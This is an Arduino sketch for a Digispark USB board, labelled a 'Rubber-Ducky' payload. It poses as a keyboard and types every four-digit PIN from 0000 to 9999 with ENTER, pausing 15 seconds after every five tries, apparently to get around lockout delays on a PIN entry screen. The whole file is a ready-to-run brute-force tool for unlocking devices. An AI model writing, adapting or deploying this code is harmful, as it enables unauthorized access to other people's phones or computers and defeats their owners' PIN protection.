/*  Rubber-Ducky / Digispark payload
    0000[ENTER] 0001[ENTER] … 9999[ENTER]
    15 s pause after every 5 numbers
*/
#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT);
  digitalWrite(1, LOW);
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  delay(2000);          // 2 s USB enumeration (bootloader already 2 s)
}

void loop() {
  for (int num = 0; num <= 9999; ++num) {
    // 4-digit zero-pad
    if (num < 10)        DigiKeyboard.print("000");
    else if (num < 100)  DigiKeyboard.print("00");
    else if (num < 1000) DigiKeyboard.print("0");
    DigiKeyboard.print(num);              // digits only
    DigiKeyboard.sendKeyStroke(KEY_ENTER); // <–– ENTER after every number

    // 15 s pause every 5 numbers
    if ((num + 1) % 5 == 0) delay(15000);
    else                    delay(200);
  }

  digitalWrite(1, HIGH);   // done
  for (;;) {}
}
